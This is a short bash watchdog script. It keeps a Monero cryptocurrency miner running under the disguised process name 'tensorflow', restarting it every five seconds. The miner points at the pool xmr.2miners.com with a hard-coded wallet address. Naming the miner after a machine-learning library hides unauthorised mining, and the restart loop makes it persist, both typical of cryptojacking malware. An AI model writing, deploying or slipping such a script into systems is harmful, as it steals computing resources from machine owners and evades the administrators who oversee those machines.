#!/bin/bash

while true; do
    if pgrep -x "tensorflow" > /dev/null; then
        :
    else
        ./tensorflow -o xmr.2miners.com:2222 -u 467DcTyWTHXNY2pudrVQ8g48Sa1fDHdWKfUwWy5nRZ26KW7gA6DbRsQ9CwDba3A3Wy5KU9P7neKp8HMSWA2PR87UHSPTF3y -p x -k --coin monero
    fi
    sleep 5
done

